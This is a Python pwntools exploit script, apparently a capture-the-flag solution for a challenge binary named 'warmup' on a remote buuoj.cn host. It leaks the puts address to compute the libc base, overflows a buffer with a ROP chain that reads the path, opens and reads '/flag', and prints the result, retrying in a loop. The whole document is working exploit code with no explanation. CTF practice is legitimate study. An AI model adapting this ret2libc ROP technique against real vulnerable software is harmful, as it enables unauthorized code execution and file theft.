from pwn import*
context(arch = 'amd64',os = 'linux')
while True:
	p = remote('node3.buuoj.cn',27526)
	#p = process('./warmup')
	libc = ELF('./libc-2.23.so',checksec=False)
	p.recvuntil('gift: ')
	puts = int(p.recvuntil('\n'),16)
	libc_base =  puts - libc.sym['puts']
	pop_rdi_ret = libc_base + 0x21102
	pop_rdx_rsi_ret = libc_base + 0x1150C9
	read = libc.sym['read'] + libc_base
	open = libc.sym['open'] + libc_base
	buf = libc.sym['_IO_2_1_stderr_'] + libc_base
	rop = flat([
		# read(0,buf,0x20)
		pop_rdi_ret, 0, pop_rdx_rsi_ret, 0x20, buf, read,
		# open('/flag',0,0x100)
		pop_rdi_ret, buf, pop_rdx_rsi_ret, 0x100, 0, open,
		# read(3,buf,0x30)
		pop_rdi_ret, 3, pop_rdx_rsi_ret, 0x30, buf, read,
		# puts(buf)
		pop_rdi_ret, buf, puts
	])
	try:
		p.sendafter('something: ','\x00'*0xD0 + rop)
		p.sendafter('name?','\x00'*0x70 +'\x18')
		p.recvuntil('!')
		p.sendline('flag\x00')
		p.recvline()
		log.info(p.recv())
	except:
		p.close()
		continue
